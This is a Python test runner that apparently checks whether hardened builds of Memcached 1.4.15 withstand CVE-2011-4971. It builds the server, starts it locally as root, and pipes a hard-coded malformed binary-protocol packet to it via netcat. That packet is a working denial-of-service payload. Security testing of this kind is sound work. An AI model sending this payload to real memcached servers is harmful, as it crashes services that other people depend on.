#!/usr/bin/env python
from __future__ import print_function

import logging
from os import environ as env
from time import sleep
from subprocess import Popen, PIPE

# enable import from parent dir
import os
import signal

from core.common_functions import *
from core.runner import Runner


class MemcachedSecurity(Runner):
    """
    Test Memcached 1.4.15 against this bug:
        https://www.rapid7.com/db/modules/auxiliary/dos/misc/memcached

    For the exploit script, you will probably need to install netcat:
        apt-get install -y netcat
    """

    name = "memcached"
    exp_name = "memcached_security"
    bench_suite = False

    benchmarks = {"bin/memcached": ""}

    def per_benchmark_action(self, type_, benchmark, args):
        build_path = "/".join([self.dirs["build"], type_])
        self.current_exe = build_path + '/' + benchmark

        build_benchmark(
            b=benchmark,
            t=type_,
            makefile=self.dirs['bench_src'],
            build_path=build_path
        )

    def per_thread_action(self, type_, benchmark, args, thread_num):
        servercmd = "{exe} -p 8080 -u root".format(exe=self.current_exe)
        logging.debug("Server command: %s" % servercmd)

        with open(self.dirs["log_file"], "a") as f:
            # start server
            my_check_output("pkill -9 memcached > /dev/null || true")  # for sanity
            sleep(1)
            server = Popen(servercmd, shell=True, stdout=PIPE, stderr=PIPE, preexec_fn=os.setsid)
            sleep(1)

            # start client (possibly on another machine)
            msg = self.run_message.format(input="CVE-2011-4971", **locals())
            self.log_run(msg)
            f.write("******************************************************************************\n")
            f.write("[exploit] " + msg + "\n")
            f.write("******************************************************************************\n")

            my_check_output(r"echo -en '\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' | nc localhost 8080")
            sleep(1)

            # log and stop server
            f.write("===== return code is %s =====\n" % str(server.poll()))
            try:
                os.killpg(server.pid, signal.SIGKILL)
            except:
                pass
            f.write("===== stdout =====\n")
            for line in server.stdout:
                f.write(line.decode('utf-8'))
            f.write("===== stderr =====\n")
            for line in server.stderr:
                f.write(line.decode('utf-8'))
            sleep(1)

    def set_logging(self):
        self.num_benchmarks = len(self.benchmarks) * len(self.types) * self.num_runs
        logging.info("Total runs: %d" % self.num_benchmarks)


def main(benchmark_name=None):
    runner = MemcachedSecurity()
    runner.main()
